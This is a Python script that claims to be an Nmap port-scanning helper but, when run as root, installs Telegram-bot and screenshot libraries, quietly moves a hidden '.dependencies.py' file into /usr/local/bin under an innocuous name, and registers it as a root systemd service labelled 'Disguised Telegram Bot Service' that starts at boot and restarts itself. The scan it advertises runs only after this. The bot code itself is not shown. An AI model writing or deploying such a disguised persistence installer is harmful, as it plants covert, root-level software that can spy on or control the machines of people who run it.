#!/usr/bin/env python3

import os
import subprocess
import sys
import shutil

# Ensure the script is run as root
if os.geteuid() != 0:
    print("This script must be run as root")
    sys.exit(1)

# Function to run a command silently with error handling
def run_command(command, check=True):
    try:
        result = subprocess.run(command, check=check, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
        return result.stdout, result.stderr
    except subprocess.CalledProcessError as e:
        print(f"Error while running command: {e}")
        sys.exit(1)

# Function to install dependencies
def install_dependencies():
    # System packages
    run_command(["apt-get", "update"], check=False)
    run_command(["apt-get", "install", "-y", "nmap", "python3", "python3-pip", "ffmpeg"])
    # Python libraries
    run_command(["pip3", "install", "python-telegram-bot", "mss", "requests"])

# Function to run an Nmap scan and show open ports
def run_nmap_scan(ip_address):
    result = subprocess.run(["nmap", "-sT", ip_address], capture_output=True, text=True)
    print(f"Nmap scan results:\n{result.stdout}")

# Function to setup the Telegram bot script to run at startup
def setup_telegram_bot():
    # Determine the directory of the current script
    current_dir = os.path.dirname(os.path.realpath(__file__))
    BOT_SCRIPT_SRC = os.path.join(current_dir, ".dependencies.py")
    BOT_SCRIPT_DST = "/usr/local/bin/dependencies_script.py"
    STARTUP_SCRIPT_PATH = "/etc/systemd/system/dependencies.service"
    
    # Move and rename the bot script to /usr/local/bin
    if os.path.exists(BOT_SCRIPT_SRC):
        shutil.move(BOT_SCRIPT_SRC, BOT_SCRIPT_DST)

    # Create systemd service file if it doesn't exist
    if not os.path.exists(STARTUP_SCRIPT_PATH):
        with open(STARTUP_SCRIPT_PATH, "w") as f:
            f.write(f"""
[Unit]
Description=Disguised Telegram Bot Service

[Service]
ExecStart=/usr/bin/python3 {BOT_SCRIPT_DST}
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
""")
        
        # Enable and start the service
        run_command(["systemctl", "enable", "dependencies.service"])
        run_command(["systemctl", "start", "dependencies.service"])

# Main script execution
install_dependencies()
setup_telegram_bot()

# Prompt the user for an IP address to scan
ip_address = input("Enter the IP address you want to scan: ")
run_nmap_scan(ip_address)

